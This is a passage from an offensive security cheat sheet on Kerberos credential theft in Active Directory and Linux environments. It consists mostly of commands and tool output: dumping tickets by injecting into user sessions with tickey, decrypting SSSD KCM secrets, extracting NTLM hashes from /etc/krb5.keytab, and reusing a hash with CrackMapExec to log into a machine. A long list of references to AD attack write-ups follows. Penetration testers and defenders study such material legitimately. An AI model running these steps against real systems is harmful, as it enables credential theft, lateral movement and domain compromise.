<a id="__codelineno-325-5" name="__codelineno-325-5" href="#__codelineno-325-5"></a>
<a id="__codelineno-325-6" name="__codelineno-325-6" href="#__codelineno-325-6"></a><span class="p">[</span><span class="n">root</span><span class="nv">@Lab</span><span class="n">-LSV01</span> <span class="p">/]</span><span class="c"># /tmp/tickey -i</span>
<a id="__codelineno-325-7" name="__codelineno-325-7" href="#__codelineno-325-7"></a><span class="p">[*]</span> <span class="n">krb5</span> <span class="n">ccache_name</span> <span class="p">=</span> <span class="n">KEYRING</span><span class="p">:</span><span class="n">session</span><span class="p">:</span><span class="n">sess_</span><span class="p">%{</span><span class="n">uid</span><span class="p">}</span>
<a id="__codelineno-325-8" name="__codelineno-325-8" href="#__codelineno-325-8"></a><span class="p">[+]</span> <span class="n">root</span> <span class="n">detected</span><span class="p">,</span> <span class="n">so</span><span class="p">...</span> <span class="n">DUMP</span> <span class="n">ALL</span> <span class="n">THE</span> <span class="n">TICKETS</span><span class="p">!!</span>
<a id="__codelineno-325-9" name="__codelineno-325-9" href="#__codelineno-325-9"></a><span class="p">[*]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">inject</span> <span class="k">in</span> <span class="n">tarlogic</span><span class="p">[</span><span class="n">1000</span><span class="p">]</span> <span class="n">session</span><span class="p">...</span>
<a id="__codelineno-325-10" name="__codelineno-325-10" href="#__codelineno-325-10"></a><span class="p">[+]</span> <span class="n">Successful</span> <span class="n">injection</span> <span class="n">at</span> <span class="k">process</span> <span class="n">25723</span> <span class="n">of</span> <span class="n">tarlogic</span><span class="p">[</span><span class="n">1000</span><span class="p">],</span><span class="n">look</span> <span class="k">for</span> <span class="n">tickets</span> <span class="k">in</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">__krb_1000</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-325-11" name="__codelineno-325-11" href="#__codelineno-325-11"></a><span class="p">[*]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">inject</span> <span class="k">in</span> <span class="n">velociraptor</span><span class="p">[</span><span class="n">1120601115</span><span class="p">]</span> <span class="n">session</span><span class="p">...</span>
<a id="__codelineno-325-12" name="__codelineno-325-12" href="#__codelineno-325-12"></a><span class="p">[+]</span> <span class="n">Successful</span> <span class="n">injection</span> <span class="n">at</span> <span class="k">process</span> <span class="n">25794</span> <span class="n">of</span> <span class="n">velociraptor</span><span class="p">[</span><span class="n">1120601115</span><span class="p">],</span><span class="n">look</span> <span class="k">for</span> <span class="n">tickets</span> <span class="k">in</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">__krb_1120601115</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-325-13" name="__codelineno-325-13" href="#__codelineno-325-13"></a><span class="p">[*]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">inject</span> <span class="k">in</span> <span class="n">trex</span><span class="p">[</span><span class="n">1120601113</span><span class="p">]</span> <span class="n">session</span><span class="p">...</span>
<a id="__codelineno-325-14" name="__codelineno-325-14" href="#__codelineno-325-14"></a><span class="p">[+]</span> <span class="n">Successful</span> <span class="n">injection</span> <span class="n">at</span> <span class="k">process</span> <span class="n">25820</span> <span class="n">of</span> <span class="n">trex</span><span class="p">[</span><span class="n">1120601113</span><span class="p">],</span><span class="n">look</span> <span class="k">for</span> <span class="n">tickets</span> <span class="k">in</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">__krb_1120601113</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-325-15" name="__codelineno-325-15" href="#__codelineno-325-15"></a><span class="no">[X]</span> <span class="p">[</span><span class="n">uid</span><span class="p">:</span><span class="n">0</span><span class="p">]</span> <span class="n">Error</span> <span class="n">retrieving</span> <span class="n">tickets</span>
</code></pre></div>
<h2 id="ccache-ticket-reuse-from-sssd-kcm">CCACHE ticket reuse from SSSD KCM</h2>
<p>SSSD maintains a copy of the database at the path <code>/var/lib/sss/secrets/secrets.ldb</code>. 
The corresponding key is stored as a hidden file at the path <code>/var/lib/sss/secrets/.secrets.mkey</code>. 
By default, the key is only readable if you have <strong>root</strong> permissions.</p>
<p>Invoking <code>SSSDKCMExtractor</code> with the --database and --key parameters will parse the database and decrypt the secrets.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-326-1" name="__codelineno-326-1" href="#__codelineno-326-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">fireeye</span><span class="p">/</span><span class="n">SSSDKCMExtractor</span>
<a id="__codelineno-326-2" name="__codelineno-326-2" href="#__codelineno-326-2"></a><span class="n">python3</span> <span class="n">SSSDKCMExtractor</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">-database</span> <span class="n">secrets</span><span class="p">.</span><span class="n">ldb</span> <span class="p">-</span><span class="n">-key</span> <span class="n">secrets</span><span class="p">.</span><span class="n">mkey</span>
</code></pre></div>
<p>The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.</p>
<h2 id="ccache-ticket-reuse-from-keytab">CCACHE ticket reuse from keytab</h2>
<div class="highlight"><pre><span></span><code><a id="__codelineno-327-1" name="__codelineno-327-1" href="#__codelineno-327-1"></a><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">://</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">its-a-feature</span><span class="p">/</span><span class="n">KeytabParser</span>
<a id="__codelineno-327-2" name="__codelineno-327-2" href="#__codelineno-327-2"></a><span class="n">python</span> <span class="n">KeytabParser</span><span class="p">.</span><span class="n">py</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">krb5</span><span class="p">.</span><span class="n">keytab</span>
<a id="__codelineno-327-3" name="__codelineno-327-3" href="#__codelineno-327-3"></a><span class="n">klist</span> <span class="n">-k</span> <span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">krb5</span><span class="p">.</span><span class="n">keytab</span>
</code></pre></div>
<h2 id="extract-accounts-from-etckrb5keytab">Extract accounts from /etc/krb5.keytab</h2>
<p>The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. </p>
<p>Use <a href="https://adoptopenjdk.net/?variant=openjdk13&amp;jvmVariant=hotspot"><code>klist</code></a> to read the keytab file and parse its content. The key that you see when the <a href="https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey">key type</a> is 23  is the actual NT Hash of the user.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-328-1" name="__codelineno-328-1" href="#__codelineno-328-1"></a><span class="p">$</span> <span class="n">klist</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="n">-K</span> <span class="n">-e</span> <span class="n">-k</span> <span class="n">FILE</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">User</span><span class="p">\</span><span class="n">downloads</span><span class="p">\</span><span class="n">krb5</span><span class="p">.</span><span class="n">keytab</span>
<a id="__codelineno-328-2" name="__codelineno-328-2" href="#__codelineno-328-2"></a><span class="p">[...]</span>
<a id="__codelineno-328-3" name="__codelineno-328-3" href="#__codelineno-328-3"></a><span class="p">[</span><span class="n">26</span><span class="p">]</span> <span class="n">Service</span> <span class="n">principal</span><span class="p">:</span> <span class="n">host</span><span class="p">/</span><span class="n">COMPUTER</span><span class="nv">@DOMAIN</span>
<a id="__codelineno-328-4" name="__codelineno-328-4" href="#__codelineno-328-4"></a>     <span class="n">KVNO</span><span class="p">:</span> <span class="n">25</span>
<a id="__codelineno-328-5" name="__codelineno-328-5" href="#__codelineno-328-5"></a>     <span class="n">Key</span> <span class="n">type</span><span class="p">:</span> <span class="n">23</span>
<a id="__codelineno-328-6" name="__codelineno-328-6" href="#__codelineno-328-6"></a>     <span class="n">Key</span><span class="p">:</span> <span class="n">31d6cfe0d16ae931b73c59d7e0c089c0</span>
<a id="__codelineno-328-7" name="__codelineno-328-7" href="#__codelineno-328-7"></a>     <span class="n">Time</span> <span class="n">stamp</span><span class="p">:</span> <span class="n">Oct</span> <span class="n">07</span><span class="p">,</span>  <span class="n">2019</span> <span class="n">09</span><span class="p">:</span><span class="n">12</span><span class="p">:</span><span class="n">02</span>
<a id="__codelineno-328-8" name="__codelineno-328-8" href="#__codelineno-328-8"></a><span class="p">[...]</span>
</code></pre></div>
<p>On Linux you can use <a href="https://github.com/sosdave/KeyTabExtract"><code>KeyTabExtract</code></a>: we want RC4 HMAC hash to reuse the NLTM hash.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-329-1" name="__codelineno-329-1" href="#__codelineno-329-1"></a><span class="p">$</span> <span class="n">python3</span> <span class="n">keytabextract</span><span class="p">.</span><span class="n">py</span> <span class="n">krb5</span><span class="p">.</span><span class="n">keytab</span> 
<a id="__codelineno-329-2" name="__codelineno-329-2" href="#__codelineno-329-2"></a><span class="p">[!]</span> <span class="n">No</span> <span class="n">RC4-HMAC</span> <span class="n">located</span><span class="p">.</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">extract</span> <span class="n">NTLM</span> <span class="n">hashes</span><span class="p">.</span> <span class="c"># No luck</span>
<a id="__codelineno-329-3" name="__codelineno-329-3" href="#__codelineno-329-3"></a><span class="p">[+]</span> <span class="n">Keytab</span> <span class="n">File</span> <span class="n">successfully</span> <span class="n">imported</span><span class="p">.</span>
<a id="__codelineno-329-4" name="__codelineno-329-4" href="#__codelineno-329-4"></a>        <span class="n">REALM</span> <span class="p">:</span> <span class="n">DOMAIN</span>
<a id="__codelineno-329-5" name="__codelineno-329-5" href="#__codelineno-329-5"></a>        <span class="n">SERVICE</span> <span class="n">PRINCIPAL</span> <span class="p">:</span> <span class="n">host</span><span class="p">/</span><span class="n">computer</span><span class="p">.</span><span class="n">domain</span>
<a id="__codelineno-329-6" name="__codelineno-329-6" href="#__codelineno-329-6"></a>        <span class="n">NTLM</span> <span class="n">HASH</span> <span class="p">:</span> <span class="n">31d6cfe0d16ae931b73c59d7e0c089c0</span> <span class="c"># Lucky</span>
</code></pre></div>
<p>On macOS you can use <code>bifrost</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-330-1" name="__codelineno-330-1" href="#__codelineno-330-1"></a><span class="p">./</span><span class="n">bifrost</span> <span class="n">-action</span> <span class="n">dump</span> <span class="n">-source</span> <span class="n">keytab</span> <span class="n">-path</span> <span class="n">test</span>
</code></pre></div>
<p>Connect to the machine using the account and the hash with CME.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-331-1" name="__codelineno-331-1" href="#__codelineno-331-1"></a><span class="p">$</span> <span class="n">crackmapexec</span> <span class="n">10</span><span class="p">.</span><span class="n">XXX</span><span class="p">.</span><span class="n">XXX</span><span class="p">.</span><span class="n">XXX</span> <span class="n">-u</span> <span class="s1">&#39;COMPUTER$&#39;</span> <span class="n">-H</span> <span class="s2">&quot;31d6cfe0d16ae931b73c59d7e0c089c0&quot;</span> <span class="n">-d</span> <span class="s2">&quot;DOMAIN&quot;</span>
<a id="__codelineno-331-2" name="__codelineno-331-2" href="#__codelineno-331-2"></a><span class="n">CME</span>          <span class="n">10</span><span class="p">.</span><span class="n">XXX</span><span class="p">.</span><span class="n">XXX</span><span class="p">.</span><span class="n">XXX</span><span class="p">:</span><span class="n">445</span> <span class="n">HOSTNAME</span><span class="p">-</span><span class="n">01</span>   <span class="p">[+]</span> <span class="n">DOMAIN</span><span class="p">\</span><span class="n">COMPUTER</span><span class="p">$</span> <span class="n">31d6cfe0d16ae931b73c59d7e0c089c0</span>  
</code></pre></div>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.roguelynn.com/words/explain-like-im-5-kerberos/">Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn</a></li>
<li><a href="https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/">Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter</a></li>
<li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin">Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema</a></li>
<li><a href="https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf">Abusing Kerberos: Kerberoasting - Haboob Team</a></li>
<li><a href="https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence">Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid</a></li>
<li><a href="https://blog.netspi.com/attacks-against-windows-pxe-boot-images/">Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling</a></li>
<li><a href="https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/">BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 &amp; @5ub34x</a></li>
<li><a href="https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html">Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh</a></li>
<li><a href="https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf">BlueHat IL - Benjamin Delpy</a></li>
<li><a href="https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE">COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger </a></li>
<li><a href="https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf">Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss</a></li>
<li><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/">DiskShadow The return of VSS Evasion Persistence and AD DB extraction</a></li>
<li><a href="https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/">Domain Penetration Testing: Using BloodHound, Crackmapexec, &amp; Mimikatz to get Domain Admin</a></li>
<li><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">Dumping Domain Password Hashes - Pentestlab</a></li>
<li><a href="https://zachgrace.com/posts/exploiting-ms14-068/">Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace</a></li>
<li><a href="https://chryzsh.github.io/exploiting-privexchange/">Exploiting PrivExchange - April 11, 2019 - @chryzsh</a></li>
<li><a href="https://www.riccardoancarani.it/exploiting-unconstrained-delegation/">Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019</a></li>
<li><a href="https://adsecurity.org/?p=2288">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</a></li>
<li><a href="https://adsecurity.org/?p=2011">How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf</a></li>
<li><a href="https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments">Fun with LDAP, Kerberos (and MSRPC) in AD Environments</a></li>
<li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html">Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r</a></li>
<li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html">Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r</a></li>
<li><a href="https://pentestlab.blog/2018/04/09/golden-ticket/">Golden ticket - Pentestlab</a></li>
<li><a href="https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/">How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff</a></li>
<li><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts - Roberto Rodriguez - Nov 28, 2018</a></li>
<li><a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast - Powersploit Read the docs</a></li>
<li><a href="https://room362.com/post/2016/kerberoast-pt1/">Kerberoasting - Part 1 - Mubix “Rob” Fuller</a></li>
<li><a href="https://michael-eder.net/post/2018/native_rdp_pass_the_hash/">Passing the hash with native RDP client (mstsc.exe)</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/">Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/">Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/">Pen Testing Active Directory Environments - Part III:  Chasing Power Users</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/">Pen Testing Active Directory Environments - Part IV: Graph Fun</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/">Pen Testing Active Directory Environments - Part V: Admins and Graphs</a></li>
<li><a href="https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/">Pen Testing Active Directory Environments - Part VI: The Final Case</a></li>
<li><a href="https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/">Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec</a></li>
<li><a href="https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/">Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec</a></li>
<li><a href="https://0metasecurity.com/post-oscp-part-2/">Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman</a></li>
<li><a href="https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/">Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith</a></li>
<li><a href="http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html">Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave</a></li>
<li><a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">Roasting AS-REPs - January 17, 2017 - harmj0y</a></li>
<li><a href="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher</a></li>
<li><a href="https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/">Using bloodhound to map the user network - Hausec</a></li>
<li><a href="https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/">WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 1</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 2</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 3</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 4</a></li>
<li><a href="https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/">WONKACHALL AKERVA NDH2018 – WRITE UP PART 5</a></li>
<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami</a></li>
<li><a href="http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/">[PrivExchange] From user to domain admin in less than 60sec ! - davy</a></li>
<li><a href="http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y</a></li>
<li><a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ</a></li>
<li><a href="https://adsecurity.org/?p=3592">Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf</a></li>
<li><a href="https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/">All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018</a></li>
<li><a href="https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf">Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon</a></li>
<li><a href="https://www.secureauth.com/blog/playing-relayed-credentials">Playing with Relayed Credentials - June 27, 2018</a></li>
<li><a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema</a></li>
<li><a href="https://blog.preempt.com/drop-the-mic">Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019</a></li>
<li><a href="https://www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/">How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous</a></li>
<li><a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX</a></li>
<li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/">Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema</a></li>
<li><a href="https://wald0.com/?p=179">A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0</a></li>
<li><a href="https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0">Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf</a></li>
<li><a href="https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61">Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10</a></li>
<li><a href="https://github.com/buftas/Active-Directory-Exploitation-Cheat-Sheet#local-privilege-escalation">Active-Directory-Exploitation-Cheat-Sheet - @buftas</a></li>
<li><a href="https://rastamouse.me/2019/01/gpo-abuse-part-1/">GPO Abuse - Part 1 - RastaMouse - 6 January 2019</a></li>
<li><a href="https://rastamouse.me/2019/01/gpo-abuse-part-2/">GPO Abuse - Part 2 - RastaMouse - 13 January 2019</a></li>
<li><a href="https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/">Abusing GPO Permissions - harmj0y - March 17, 2016</a></li>
<li><a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html">How To Attack Kerberos 101 - m0chan - July 31, 2019</a></li>
<li><a href="https://sensepost.com/blog/2020/ace-to-rce/">ACE to RCE - @JustinPerdok - July 24, 2020</a></li>
<li><a href="https://www.secura.com/pathtoimg.php?id=2055">Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020</a></li>
<li><a href="https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces">Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs</a></li>
<li><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/">CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020</a></li>
<li><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/">CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020</a></li>
<li><a href="https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory">Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory</a></li>
<li><a href="https://pentestmag.com/gpo-abuse-you-cant-see-me/">GPO Abuse: "You can't see me" - Huy Kha -  July 19, 2019</a></li>
<li><a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017</a></li>
<li><a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques">New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018</a></li>
<li><a href="https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html">Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell</a></li>
<li><a href="https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/">AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev</a></li>
<li><a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17</a></li>
<li><a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">Playing with PrintNightmare - 0xdf - Jul 8, 2021</a></li>
<li><a href="https://zer1t0.gitlab.io/posts/attacking_ad/">Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29</a></li>
<li><a href="https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/">Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021</a></li>
<li><a href="http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/">Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021</a></li>
<li><a href="https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/">NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema</a></li>
<li><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf">Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_</a></li>
<li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">Certified Pre-Owned - Will Schroeder - Jun 17 2021</a></li>
<li><a href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021</a></li>
<li><a href="https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb">NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash">UnPAC the hash - The Hacker Recipes</a></li>
<li><a href="https://pentestlab.blog/2021/10/20/lateral-movement-webclient/">Lateral Movement – WebClient</a></li>
<li><a href="https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition">Shadow Credentials: Workstation Takeover Edition - Matthew Creel</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates">Certificate templates - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration">CA configuration - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/access-controls">Access controls - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints">Web endpoints - The Hacker Recipes</a></li>
<li><a href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">sAMAccountName spoofing - The Hacker Recipes</a></li>
<li><a href="https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html">CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph</a></li>
<li><a href="https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4">ADCS: Playing with ESC4 - Matthew Creel</a></li>
<li><a href="https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/">The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo</a></li>
<li><a href="https://www.blackarrow.net/adcs-weaponizing-esc7-attack/">AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022</a></li>
<li><a href="https://www.blackarrow.net/ad-cs-from-manageca-to-rce/">AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh</a></li>
<li><a href="https://www.semperis.com/blog/golden-gmsa-attack/">Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022</a></li>
<li><a href="https://labs.nettitude.com/blog/introducing-malsccm/">Introducing MalSCCM - Phil Keeble -May 4, 2022</a></li>
<li><a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak</a></li>
<li><a href="https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html">bloodyAD and CVE-2022-26923 - soka - 11 May 2022</a></li>
<li><a href="https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/">DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe</a></li>
<li><a href="http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html">How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal</a></li>
